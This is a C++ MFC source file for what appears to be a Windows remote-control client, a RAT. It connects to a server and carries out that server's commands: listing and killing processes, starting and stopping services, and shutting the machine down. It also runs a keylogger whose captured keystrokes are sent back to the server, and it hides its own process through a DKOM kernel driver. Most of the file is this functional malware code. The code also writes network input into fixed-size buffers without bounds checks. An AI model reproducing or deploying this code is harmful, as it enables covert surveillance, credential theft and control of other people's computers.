
// GUI_Client2.cpp : Defines the class behaviors for the application.
//

#include "stdafx.h"
#include "GUI_Client2.h"
#include "GUI_Client2Dlg.h"
#include "utils.h"
#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// CGUI_Client2App

BEGIN_MESSAGE_MAP(CGUI_Client2App, CWinApp)
	ON_COMMAND(ID_HELP, &CWinApp::OnHelp)
END_MESSAGE_MAP()


// CGUI_Client2App construction

CGUI_Client2App::CGUI_Client2App()
{
	// support Restart Manager
	m_dwRestartManagerSupportFlags = AFX_RESTART_MANAGER_SUPPORT_RESTART;

	// TODO: add construction code here,
	// Place all significant initialization in InitInstance
}


// The one and only CGUI_Client2App object

CGUI_Client2App theApp;


// CGUI_Client2App initialization

BOOL CGUI_Client2App::InitInstance()
{
	// InitCommonControlsEx() is required on Windows XP if an application
	// manifest specifies use of ComCtl32.dll version 6 or later to enable
	// visual styles.  Otherwise, any window creation will fail.
	INITCOMMONCONTROLSEX InitCtrls;
	InitCtrls.dwSize = sizeof(InitCtrls);
	// Set this to include all the common control classes you want to use
	// in your application.
	InitCtrls.dwICC = ICC_WIN95_CLASSES;
	InitCommonControlsEx(&InitCtrls);

	CWinApp::InitInstance();


	AfxEnableControlContainer();

	// Create the shell manager, in case the dialog contains
	// any shell tree view or shell list view controls.
	CShellManager *pShellManager = new CShellManager;

	// Activate "Windows Native" visual manager for enabling themes in MFC controls
	CMFCVisualManager::SetDefaultManager(RUNTIME_CLASS(CMFCVisualManagerWindows));

	// Standard initialization
	// If you are not using these features and wish to reduce the size
	// of your final executable, you should remove from the following
	// the specific initialization routines you do not need
	// Change the registry key under which our settings are stored
	// TODO: You should modify this string to be something appropriate
	// such as the name of your company or organization
	SetRegistryKey(_T("Local AppWizard-Generated Applications"));

	CGUI_Client2Dlg dlg;
	m_pMainWnd = &dlg;
	INT_PTR nResponse = dlg.DoModal();
	if (nResponse == IDOK)
	{
		// TODO: Place code here to handle when the dialog is
		//  dismissed with OK
	}
	else if (nResponse == IDCANCEL)
	{
		// TODO: Place code here to handle when the dialog is
		//  dismissed with Cancel
	}
	else if (nResponse == -1)
	{
		TRACE(traceAppMsg, 0, "Warning: dialog creation failed, so application is terminating unexpectedly.\n");
		TRACE(traceAppMsg, 0, "Warning: if you are using MFC controls on the dialog, you cannot #define _AFX_NO_MFC_CONTROLS_IN_DIALOGS.\n");
	}

	// Delete the shell manager created above.
	if (pShellManager != NULL)
	{
		delete pShellManager;
	}

	// Since the dialog has been closed, return FALSE so that we exit the
	//  application, rather than start the application's message pump.
	return FALSE;
}

//application tools
void CGUI_Client2App::seeapp(CDialog* dlg){
	//get process list by calling function of utils.h
	WCHAR* mess = GetProcessList();
	
	//if mess==null, send failed feedback,else seen list app.
	if (mess == NULL){
		this->sendFeedback("failed");
	}
	else{
		//send feedback
		this->sendFeedback("successfully");

		//size of next data transfer batch
		int f = wcslen(mess) + 1; 

		//send the size
		int t = f*sizeof(WCHAR);
		this->client.Send(&t, 4, 0);
		
		//send the data
		int k = this->client.Send(mess, t, 0);

		//clearing
		delete mess;
	}

}

void CGUI_Client2App::killapp(CDialog* dlg){
	//declare some important things.. app id is limited to 1000 wchar
	WCHAR appid[1000];
	int receiveSize;

	//parse receiveSize and appid
	receiveExactlyNByte( (char*)&receiveSize, 4);
	receiveExactlyNByte( (char*)appid, receiveSize);

	//repare command to kill the app, join pid with command
	WCHAR cmd[10000] = _T("taskkill /f /pid ");
	wcscat(cmd, appid);

	USES_CONVERSION;
	char *run = W2A(cmd);

	//kill app, get result
	bool succeed = exec(run).length()>0;

	//send feedback to server
	if (succeed){
		sendFeedback("killed App");
	}
	else
	{
		sendFeedback("can't kill App");
	}
}

void CGUI_Client2App::startapp(CDialog* dlg){
	//declare some important things.. app name is limited to 1000 wchar
	WCHAR appname[1000];
	int receiveSize;

	//parse receiveSize and appname
	receiveExactlyNByte( (char*)&receiveSize, 4);
	receiveExactlyNByte( (char*)appname, receiveSize);

	//try to open the app
	bool succeed = openProcess(appname);
	
	//send feedback to server	
	if (succeed){
		sendFeedback("opened successfully");
	}
	else
	{
		sendFeedback("Can't start App");
	}
}

//services tools
void CGUI_Client2App::seeservice(CDialog* dlg){

	//get list of service by calling exec function in utils
	string listService = exec("net start");


	if (listService.length() == 0){
		//length ==0 means it failed
		this->sendFeedback("failed");
	}
	else
	{
		//send feedback
		this->sendFeedback( "successfully");
		int sendSize = listService.length() + 1;
		
		//send service list size and data size
		client.Send(&sendSize, 4, 0);
		client.Send(listService.c_str(), sendSize, 0);
	}
}

void CGUI_Client2App::startserivce(CDialog* dlg){
	//declare some important things.. app name is limited to 1000 wchar
	WCHAR servicename[1000];
	int receiveSize;

	//parse receiveSize and appname
	receiveExactlyNByte( (char*)&receiveSize, 4);
	receiveExactlyNByte( (char*)servicename, receiveSize);

	//repare the command
	char command[200] = "net start ";
	USES_CONVERSION;
	char* service = W2A(servicename);
	strcat(command, service);

	//execute the command and get result
	string s = exec(command);
	bool succeed = s.length() > 0;
	//feed back to user, length ==0 means it failed
	if (succeed){
		sendFeedback( "service started successfully");
	}
	else
	{
		sendFeedback( "can't start service");
	}
}

void CGUI_Client2App::stopservice(CDialog* dlg){
	//declare some important things.. app name is limited to 1000 wchar
	WCHAR servicename[1000];
	int receiveSize;

	//parse receiveSize and appname
	receiveExactlyNByte( (char*)&receiveSize, 4);
	receiveExactlyNByte( (char*)servicename, receiveSize);

	//repare the command
	char command[200] = "net stop ";
	USES_CONVERSION;
	char* service = W2A(servicename);
	strcat(command, service);

	//execute the command
	string s = exec(command);
	bool succeed = s.length() > 0;
	if (succeed){
		sendFeedback( "service stopped successfully");
	}
	else
	{
		sendFeedback( "can't stop service");
	}
}

//shut down
void CGUI_Client2App::shutdown(CDialog* dlg){
	system("shutdown -s");
}

//keylog tools
void CGUI_Client2App::startHook(CDialog* dlg){
	isHooked = true;
	CWinThread *h1 = AfxBeginThread(thread_keyboardcatch, (LPVOID)this, THREAD_PRIORITY_NORMAL, 0, 0, NULL);
}
void CGUI_Client2App::stopHook(CDialog* dlg){
	isHooked = false;
	keylogfile.close();
}
void CGUI_Client2App::getHook(CDialog* dlg){
	ifstream logfile(KEY_LOG_FILE_PATH);

	string line;
	getline(logfile, line);
	
	this->hookdata = line;

	int nByte;
	nByte = this->hookdata.length() + 1;
	client.Send(&nByte, 4, 0);
	client.Send(this->hookdata.c_str(), nByte, 0);
}

int callHide(DWORD ProcessId){
	HANDLE hFile;
	DWORD  write;

	hFile = CreateFile((LPCWSTR)CString("\\\\.\\DKOM_Driver"), GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

	if (hFile == INVALID_HANDLE_VALUE)
	{
		//printf("Error: Unable to connect to the driver (%d)\nMake sure the driver is loaded.", GetLastError());
		return -1;
	}

	//printf("\nEnter PID: ");
	//scanf("%d", &ProcessId);

	if (!WriteFile(hFile, &ProcessId, sizeof(DWORD), &write, NULL))
	{
		return -1;
	}

	return 0;
}

void CGUI_Client2App::hide(CDialog* dlg){
	system("install.bat");
	DWORD pid = GetCurrentProcessId();
	int ret = callHide(pid);
	if (ret == 0){
		ShowWindow(dlg->m_hWnd, SW_HIDE);
		sendFeedback("succesffully");
	}
	else{
		sendFeedback("failed");
	}
	//ShowWindow(hwnd, SW_HIDE)
}

void CGUI_Client2App::connect(CDialog* dlg){
	WCHAR sv[20];
	GetDlgItemText(dlg->m_hWnd, IDC_serverAddress, sv, 200);
	CString serverAddress(sv);
	AfxSocketInit();
	this->client.Create();
	if (client.Connect((LPCTSTR)serverAddress, 1124)){

		((CGUI_Client2Dlg*)dlg)->updateBoxChat(CString("Connected to") + serverAddress + CString("\r\n"));
		((CGUI_Client2Dlg*)dlg)->updateBoxChat(CString("The app is entered controlled mode by server") + serverAddress + CString("\r\n"));
		this->mainloop(dlg);
	}
	else{
		((CGUI_Client2Dlg*)dlg)->updateBoxChat(CString("Fail connection to") + serverAddress + CString("\r\n"));
	}
}

void CGUI_Client2App::mainloop(CDialog* dlg){
	char command[100];
	do{
		memset(command, 0, 100);
		this->receiveExactlyNByte(command, 100);
		if (!strcmp(command, "shutdown"))
			shutdown(dlg);
		else if (!strcmp(command, "app-see"))
			seeapp(dlg);
		else if (!strcmp(command, "app-start"))
			startapp(dlg);
		else if (!strcmp(command, "app-kill"))
			killapp(dlg);
		else if (!strcmp(command, "service-see"))
			seeservice(dlg);
		else if (!strcmp(command, "service-start"))
			startserivce(dlg);
		else if (!strcmp(command, "service-stop"))
			stopservice(dlg);
		else if (!strcmp(command, "hook-start"))
			startHook(dlg);
		else if (!strcmp(command, "hook-stop"))
			stopHook(dlg);
		else if (!strcmp(command, "hook-get"))
			getHook(dlg);
		else if (!strcmp(command, "hide"))
			hide(dlg);

	} while (strcmp(command, "quit"));
	disconnect(dlg);
}


void CGUI_Client2App::disconnect(CDialog* dlg){
	client.Close();
	((CGUI_Client2Dlg*)dlg)->updateBoxChat("Disconnected to server");
	//clearing:
	hookdata = "";
	isHooked = 0;
}
//connection tool
void CGUI_Client2App::sendFeedback(char* message){
	char xmess[100];
	strcpy(xmess, message);
	xmess[strlen(message)] = '\0';
	this->client.Send(xmess, 100, 0);
}
int CGUI_Client2App::receiveExactlyNByte(char* buffer, int nByte){
	int sum = 0;
	do{
		if (sum == nByte)
			break;
		sum += this->client.Receive(buffer + sum, nByte - sum, 0);
	} while (1);
	return sum;
}